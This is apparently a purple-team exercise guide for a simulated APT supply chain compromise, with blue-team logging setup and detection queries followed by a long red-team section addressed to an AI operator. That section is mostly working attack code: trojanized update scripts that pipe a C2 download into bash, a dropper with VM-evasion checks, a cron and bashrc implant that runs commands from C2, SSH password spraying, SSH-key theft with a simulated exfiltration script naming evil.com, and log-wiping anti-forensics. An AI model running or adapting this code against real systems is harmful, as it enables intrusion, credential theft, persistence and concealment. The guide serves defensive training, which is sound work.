# Advanced APT Simulation: Supply Chain Compromise

**Exercise ID**: EXP-001  
**MITRE ATT&CK Tactics**: Multiple tactics spanning complete attack lifecycle  
**Difficulty**: 🔴 Expert  
**Duration**: 8-12 hours (or multi-day)  

## Overview & Learning Objectives

This comprehensive exercise simulates a sophisticated APT campaign involving supply chain compromise, advanced persistence, and multi-stage payload deployment. Designed for experienced purple teams, this exercise tests the full spectrum of detection and response capabilities.

**Learning Outcomes:**

- Detect complex, multi-vector attack campaigns
- Understand advanced evasion and anti-forensics techniques
- Build threat-hunting capabilities for APT-level activities
- Practice incident response for nation-state level threats

**Target MITRE ATT&CK Techniques:**

- T1195.002: Supply Chain Compromise - Compromise Software Supply Chain
- T1574.002: Hijack Execution Flow - DLL Side-Loading
- T1055.012: Process Injection - Process Hollowing
- T1027.002: Obfuscated Files or Information - Software Packing
- T1041: Exfiltration Over C2 Channel
- T1562.001: Impair Defenses - Disable or Modify Tools
- T1070.003: Indicator Removal - Clear Command History
- T1078.004: Valid Accounts - Cloud Accounts

## Infrastructure Requirements

- **Minimum Setup**: 5 machines (1 Kali, 4 victims with different roles)
- **Recommended Setup**: 8+ machines with complex network topology
- **Network**: Multiple VLANs simulating enterprise segmentation
- **Services**: Web servers, database servers, domain controllers, workstations
- **Monitoring**: Full EDR/SIEM coverage with advanced analytics
- **Prerequisites**: Advanced logging, memory forensics tools, network monitoring

## Setup Instructions (for Blue Team)

### Complex Network Topology

```
    ┌─────────────┐     ┌─────────────┐
    │   Kali      │     │   C2 Infra  │
    │ (Attacker)  │─────│ (External)  │
    │ 10.0.1.10   │     │ 10.0.1.5    │
    └─────────────┘     └─────────────┘
           │
    ┌─────────────┐     ┌─────────────┐
    │   DMZ Web   │     │   Dev Ops   │
    │  (Entry)    │─────│ (Supply)    │
    │ 10.0.2.10   │     │ 10.0.3.10   │
    └─────────────┘     └─────────────┘
           │                    │
    ┌─────────────┐     ┌─────────────┐
    │  Workstation│     │   Domain    │
    │  (Target)   │─────│ Controller  │
    │ 10.0.4.10   │     │ 10.0.4.5    │
    └─────────────┘     └─────────────┘
           │
    ┌─────────────┐
    │  Database   │
    │  (Crown)    │
    │ 10.0.5.10   │
    └─────────────┘
```

### Advanced Logging Configuration

1. **Enhanced EDR Deployment**

   ```bash
   # Deploy comprehensive monitoring on all systems
   
   # Enable PowerShell logging (Windows hosts)
   # Configure Sysmon with advanced configuration
   # Deploy OSQuery for real-time querying
   # Enable Windows Event Forwarding
   
   # Linux hosts - advanced auditd rules
   sudo auditctl -w /usr/bin -p x -k binary_execution
   sudo auditctl -w /lib -p wa -k library_modification
   sudo auditctl -w /lib64 -p wa -k library_modification
   sudo auditctl -a exit,always -F arch=b64 -S ptrace -k process_injection
   sudo auditctl -a exit,always -F arch=b64 -S mmap -k memory_mapping
   ```

2. **Network Monitoring Setup**

   ```bash
   # Deploy packet capture and analysis
   # Configure Zeek/Suricata for advanced network detection
   # Set up SSL/TLS inspection
   # Deploy network segmentation monitoring
   ```

3. **Memory Forensics Preparation**

   ```bash
   # Install Volatility framework
   # Configure automated memory dump collection
   # Set up behavioral analysis sandbox
   ```

### SIEM Advanced Analytics

**Splunk - APT Campaign Detection:**

```splunk
| multisearch 
    [search index=windows EventCode=4688 OR EventCode=1 | eval phase="execution"]
    [search index=network src=10.0.2.10 | eval phase="c2_communication"] 
    [search index=linux auditd | eval phase="lateral_movement"]
| eval attack_chain=case(
    phase="execution" AND match(CommandLine,"powershell.*-enc"), "Encoded PowerShell",
    phase="c2_communication" AND match(dest_port,"443|8080|8443"), "C2 Traffic",
    phase="lateral_movement" AND match(key,"ssh"), "SSH Lateral Movement",
    1=1, "Other"
)
| transaction maxspan=30m startswith="execution" endswith="lateral_movement"
| where eventcount > 5
| eval apt_score=eventcount*10
| sort -apt_score
```

**qRadar - Supply Chain Indicators:**

```sql
WITH supply_chain_events AS (
    SELECT sourceip, destinationip, payload, starttime,
           CASE 
               WHEN payload LIKE '%software%update%' THEN 'Software Update'
               WHEN payload LIKE '%dll%load%' THEN 'DLL Loading'
               WHEN payload LIKE '%process%inject%' THEN 'Process Injection'
               ELSE 'Other'
           END as event_type
    FROM events 
    WHERE starttime > NOW() - INTERVAL '12 HOURS'
)
SELECT sourceip, event_type, COUNT(*) as frequency,
       MIN(starttime) as first_seen, MAX(starttime) as last_seen
FROM supply_chain_events
GROUP BY sourceip, event_type
HAVING COUNT(*) > 3
ORDER BY frequency DESC
```

## Red Team AI Instructions

**Context**: You are an advanced AI red team operator simulating a nation-state APT group conducting a sophisticated supply chain attack. This is a complex, multi-phase operation requiring careful operational security and realistic APT techniques. Execute this campaign over 8-12 hours with appropriate timing between phases.

### Phase 1: Initial Reconnaissance and Target Assessment (T1592, T1598)

**Objective**: Conduct thorough reconnaissance of the target organization and identify supply chain vulnerabilities.

1. **OSINT and External Reconnaissance:**

   ```bash
   # Passive reconnaissance (simulate research phase)
   echo "Conducting OSINT research on target organization..."
   echo "Target identified: $(hostname) - Web server with software update mechanism"
   
   # Network enumeration
   nmap -sS -sV -O 10.0.2.0/24
   nmap -sS -p 80,443,8080 10.0.3.0/24  # Look for DevOps infrastructure
   
   # Service enumeration
   curl -I http://10.0.2.10/updates/
   curl -I http://10.0.3.10/build/
   ```

2. **Supply Chain Target Identification:**

   ```bash
   # Identify software distribution mechanisms
   find /var/www -name "*update*" -o -name "*download*" 2>/dev/null
   find /opt -name "*build*" -o -name "*deploy*" 2>/dev/null
   
   # Look for development and deployment infrastructure
   ps aux | grep -E "(jenkins|docker|git|npm|pip)"
   netstat -tulpn | grep -E ":8080|:3000|:9000"
   ```

### Phase 2: Supply Chain Compromise (T1195.002, T1574.002)

**Objective**: Compromise the software supply chain to deliver malicious payloads to downstream targets.

1. **Initial Supply Chain Access:**

   ```bash
   # Compromise development/build server
   ssh -o StrictHostKeyChecking=no devops@10.0.3.10
   
   # Once connected to DevOps server:
   hostname && whoami && id
   ps aux | grep -E "(build|deploy|git)"
   find /home -name "*.key" -o -name "*config*" 2>/dev/null
   ```

2. **Malicious Package Injection:**

   ```bash
   # Create malicious library for DLL side-loading
   mkdir -p /tmp/.build_cache/
   
   # Simulate creating malicious script (cross-platform)
   cat > /tmp/.build_cache/update_helper.sh <<'EOF'
   #!/bin/bash
   # Legitimate-looking update helper
   echo "Checking system compatibility..."
   
   # Hidden malicious functionality
   curl -s http://10.0.1.5:8080/stage1.sh -o /tmp/.sys_check
   chmod +x /tmp/.sys_check
   nohup /tmp/.sys_check >/dev/null 2>&1 &
   
   echo "System check completed"
   EOF
   
   chmod +x /tmp/.build_cache/update_helper.sh
   ```

3. **Software Update Mechanism Compromise:**

   ```bash
   # Modify legitimate update mechanism
   find /var/www -name "*update*" -type f 2>/dev/null
   
   # Create trojanized update package
   cat > /tmp/security_update.sh <<'EOF'
   #!/bin/bash
   # Legitimate security update script (modified)
   echo "Installing critical security updates..."
   
   # Hidden malicious payload
   if command -v curl >/dev/null 2>&1; then
       curl -s http://10.0.1.5:8080/payload.sh | bash
   else
       wget -q -O- http://10.0.1.5:8080/payload.sh | bash
   fi
   
   echo "Security updates installed successfully"
   touch /var/log/security_update_$(date +%Y%m%d).log
   EOF
   
   chmod +x /tmp/security_update.sh
   # Deploy to update server
   cp /tmp/security_update.sh /var/www/html/updates/
   ```

### Phase 3: Multi-Stage Payload Deployment (T1055.012, T1027.002)

**Objective**: Deploy sophisticated malware with advanced evasion capabilities.

1. **Stage 1 - Initial Dropper:**

   ```bash
   # Create advanced dropper with environment checks
   cat > /tmp/stage1.sh <<'EOF'
   #!/bin/bash
   # Advanced dropper with anti-analysis
   
   # Environment validation
   if [ $(ps aux | wc -l) -lt 30 ]; then exit; fi
   if [ -d "/proc/vz" ]; then exit; fi  # OpenVZ detection
   if lscpu | grep -q "hypervisor"; then 
       sleep 300  # Delay in VM environments
   fi
   
   # System information gathering
   hostname > /tmp/.sys_info
   uname -a >> /tmp/.sys_info
   id >> /tmp/.sys_info
   
   # Download stage 2
   for i in {1..3}; do
       if curl -s http://10.0.1.5:8080/stage2.sh -o /tmp/.update_check; then
           chmod +x /tmp/.update_check
           /tmp/.update_check &
           break
       fi
       sleep $((RANDOM % 60 + 30))
   done
   
   # Cleanup
   rm -f /tmp/.sys_info
   history -c 2>/dev/null
   EOF
   
   chmod +x /tmp/stage1.sh
   ```

2. **Stage 2 - Persistence and Communication:**

   ```bash
   # Create persistent implant
   cat > /tmp/stage2.sh <<'EOF'
   #!/bin/bash
   # Advanced persistent implant
   
   # Create working directory
   mkdir -p /tmp/.cache/systemd
   cd /tmp/.cache/systemd
   
   # Multi-method persistence
   # Method 1: Cron job
   (crontab -l 2>/dev/null; echo "*/15 * * * * /tmp/.cache/systemd/worker") | crontab -
   
   # Method 2: Profile persistence
   echo 'nohup /tmp/.cache/systemd/worker >/dev/null 2>&1 &' >> ~/.bashrc
   
   # Create main payload
   cat > worker <<'WORKER'
   #!/bin/bash
   while true; do
       # Beacon home
       curl -s -X POST http://10.0.1.5:8443/checkin \
            -H "User-Agent: curl/7.68.0" \
            -d "id=$(hostname)&ts=$(date +%s)" 2>/dev/null
       
       # Check for commands
       cmd=$(curl -s http://10.0.1.5:8443/cmd/$(hostname) 2>/dev/null)
       if [ ! -z "$cmd" ]; then
           eval "$cmd" 2>/dev/null
       fi
       
       # Random sleep between 300-900 seconds
       sleep $((RANDOM % 600 + 300))
   done
   WORKER
   
   chmod +x worker
   nohup ./worker >/dev/null 2>&1 &
   EOF
   
   chmod +x /tmp/stage2.sh
   ```

### Phase 4: Advanced Lateral Movement (T1078.003, T1021.004)

**Objective**: Move laterally through the network using sophisticated techniques.

1. **Credential Harvesting:**

   ```bash
   # Advanced credential discovery
   find /home -name ".ssh" -type d 2>/dev/null | while read dir; do
       echo "SSH directory found: $dir"
       ls -la "$dir/"
   done
   
   # Search for credential files
   find /opt -name "*config*" -o -name "*credential*" -o -name "*password*" 2>/dev/null
   grep -r "password\|credential\|secret" /opt/ 2>/dev/null | head -10
   
   # Check for database credentials
   find /etc -name "*sql*" -o -name "*db*" 2>/dev/null
   ```

2. **Lateral Movement Execution:**

   ```bash
   # Test connectivity to targets
   for host in 10.0.4.5 10.0.4.10 10.0.5.10; do
       echo "Testing connectivity to $host"
       ping -c 2 $host >/dev/null 2>&1 && echo "Host $host is reachable"
   done
   
   # SSH key-based movement
   if [ -f /home/service/.ssh/id_rsa ]; then
       chmod 600 /home/service/.ssh/id_rsa
       ssh -o StrictHostKeyChecking=no -i /home/service/.ssh/id_rsa service@10.0.4.10 "whoami && hostname"
   fi
   
   # Password-based authentication
   for user in admin administrator service backup; do
       for pass in Password123! Admin123! Service123!; do
           sshpass -p "$pass" ssh -o ConnectTimeout=3 "$user@10.0.4.10" "echo success" 2>/dev/null && \
           echo "Successful login: $user:$pass on 10.0.4.10"
       done
   done
   ```

3. **Establish Foothold on New Systems:**

   ```bash
   # Deploy implant to newly compromised systems
   cat > /tmp/deploy_implant.sh <<'EOF'
   #!/bin/bash
   target_host=$1
   credentials=$2
   
   # Copy implant to new host
   scp -o StrictHostKeyChecking=no /tmp/.cache/systemd/worker $credentials@$target_host:/tmp/.sys_worker
   
   # Execute implant remotely
   ssh -o StrictHostKeyChecking=no $credentials@$target_host "
       chmod +x /tmp/.sys_worker
       nohup /tmp/.sys_worker >/dev/null 2>&1 &
       echo 'nohup /tmp/.sys_worker >/dev/null 2>&1 &' >> ~/.bashrc
   "
   EOF
   
   chmod +x /tmp/deploy_implant.sh
   ```

### Phase 5: Data Exfiltration and Anti-Forensics (T1041, T1070.003)

**Objective**: Locate and exfiltrate sensitive data while covering tracks.

1. **Sensitive Data Discovery:**

   ```bash
   # Comprehensive data discovery
   find /home -type f \( -name "*confidential*" -o -name "*secret*" -o -name "*financial*" -o -name "*.key" \) 2>/dev/null
   find /opt -type f \( -name "*.db" -o -name "*.sql" -o -name "*backup*" -o -name "*dump*" \) 2>/dev/null
   find /var -type f \( -name "*customer*" -o -name "*client*" -o -name "*personal*" \) 2>/dev/null
   
   # Database discovery
   ps aux | grep -E "(mysql|postgres|sqlite|oracle)"
   netstat -tulpn | grep -E ":3306|:5432|:1521"
   ```

2. **Covert Data Exfiltration:**

   ```bash
   # Create exfiltration script with steganography
   cat > /tmp/exfil.py <<'EOF'
   #!/usr/bin/env python3
   import os, base64, time, hashlib
   import urllib.request, urllib.parse
   
   def exfil_data(file_path, chunk_size=1024):
       """Exfiltrate data via DNS tunneling simulation"""
       try:
           with open(file_path, 'rb') as f:
               data = f.read()
           
           # Encode and chunk data
           encoded = base64.b64encode(data).decode()
           chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
           
           for i, chunk in enumerate(chunks):
               # Simulate DNS exfiltration
               subdomain = f"data{i}.{hashlib.md5(chunk.encode()).hexdigest()[:8]}.evil.com"
               print(f"Exfiltrating chunk {i+1}/{len(chunks)}: {subdomain}")
               time.sleep(2)  # Slow exfiltration
           
           print(f"Successfully exfiltrated {file_path}")
       except Exception as e:
           print(f"Exfiltration failed: {e}")
   
   # Exfiltrate discovered files
   import glob
   sensitive_files = glob.glob("/opt/*config*") + glob.glob("/home/*/.ssh/id_*")
   for file_path in sensitive_files[:3]:  # Limit for demo
       if os.path.isfile(file_path):
           exfil_data(file_path)
   EOF
   
   python3 /tmp/exfil.py
   ```

3. **Advanced Anti-Forensics:**

   ```bash
   # Sophisticated cleanup and anti-forensics
   cat > /tmp/cleanup.sh <<'EOF'
   #!/bin/bash
   # Advanced cleanup to evade forensics
   
   # Selective history cleaning
   sed -i '/10\.0\.1\.5/d' ~/.bash_history 2>/dev/null
   sed -i '/curl.*evil/d' ~/.bash_history 2>/dev/null
   sed -i '/stage[12]/d' ~/.bash_history 2>/dev/null
   
   # Add legitimate-looking entries
   echo "ls -la /var/log" >> ~/.bash_history
   echo "tail /var/log/syslog" >> ~/.bash_history
   echo "systemctl status" >> ~/.bash_history
   
   # Log file selective editing
   sudo sed -i '/10\.0\.1\.5/d' /var/log/auth.log 2>/dev/null
   sudo sed -i '/evil\.com/d' /var/log/syslog 2>/dev/null
   
   # File timestamp manipulation
   touch -r /bin/ls /tmp/.cache/systemd/worker 2>/dev/null
   
   # Secure deletion of artifacts
   shred -vfz -n 3 /tmp/stage*.sh /tmp/exfil.py 2>/dev/null
   rm -f /tmp/.sys_* /tmp/deploy_implant.sh
   
   # Clear command history
   history -c
   
   echo "Cleanup completed"
   EOF
   
   chmod +x /tmp/cleanup.sh
   /tmp/cleanup.sh
   ```

### Expected AI Behavior

- **Maintain realistic APT timing** - execute phases over 8-12 hours
- **Document all TTP implementations** with detailed explanations
- **Provide comprehensive IOCs** for each phase
- **Simulate real threat actor behaviors** including mistakes and retries
- **Generate realistic network traffic** patterns

## Detection Scenarios

### Scenario 1: Supply Chain Compromise Detection

**Expected Timeline**: 0-2 hours
**What Blue Team Should See**: Anomalous activity in software distribution infrastructure

**Advanced Detection Points:**

- Unauthorized modifications to update servers
- Suspicious build process artifacts
- Abnormal developer/CI system behaviors
- Trojanized software packages

### Scenario 2: Multi-Stage Malware Deployment

**Expected Timeline**: 2-6 hours
**What Blue Team Should See**: Sophisticated payload deployment with evasion

**Detection Points:**

- Anti-analysis environment checks
- Multi-stage payload downloads
- Process injection attempts
- Encrypted C2 communications

### Scenario 3: Advanced Persistent Threat Activity

**Expected Timeline**: 6-10 hours
**What Blue Team Should See**: Sophisticated lateral movement and persistence

**Detection Points:**

- Cross-network authentication patterns
- Advanced credential harvesting
- Multiple persistence mechanisms
- Covert channel communications

### Scenario 4: Data Exfiltration and Cleanup

**Expected Timeline**: 10-12 hours
**What Blue Team Should See**: Large-scale data theft with anti-forensics

**Detection Points:**

- Steganographic exfiltration patterns
- Selective log manipulation
- File timestamp anomalies
- Memory artifacts

## Expected Outcomes

### Expert-Level Success Metrics

- **Complete Campaign Reconstruction**: Full attack timeline and attribution
- **Advanced Threat Hunting**: Proactive discovery of APT activities
- **Memory Forensics**: Advanced malware analysis and reverse engineering
- **Intelligence Production**: Actionable threat intelligence generation

### Advanced Capabilities Assessment

1. **Supply Chain Security**: Evaluation of software integrity controls
2. **Advanced Analytics**: ML/AI-based detection effectiveness
3. **Memory Forensics**: Runtime analysis and sandboxing capabilities
4. **Attribution Analysis**: APT group behavior pattern recognition

## Cleanup & Lessons Learned

### Comprehensive Environment Reset

```bash
# Complete infrastructure cleanup required
# Restore all VMs from clean snapshots
# Reset network configurations
# Clear all C2 infrastructure
# Verify no persistent mechanisms remain
```

### Expert-Level Discussion Points

- Effectiveness against nation-state level threats
- Supply chain security gap identification
- Advanced persistent threat attribution accuracy
- Memory forensics and behavioral analysis capabilities

### Capability Enhancement Roadmap

1. **Zero-Trust Architecture**: Implementation planning
2. **Advanced EDR**: Next-generation endpoint protection
3. **Threat Intelligence**: Real-time APT indicator integration
4. **Incident Response**: APT-specific playbook development

---

**Exercise Notes:**

- Requires expert-level cybersecurity and threat intelligence knowledge
- Consider external threat intelligence support for realistic attribution
- Excellent preparation for defending against nation-state actors
- Can be extended to multi-week campaigns for maximum realism
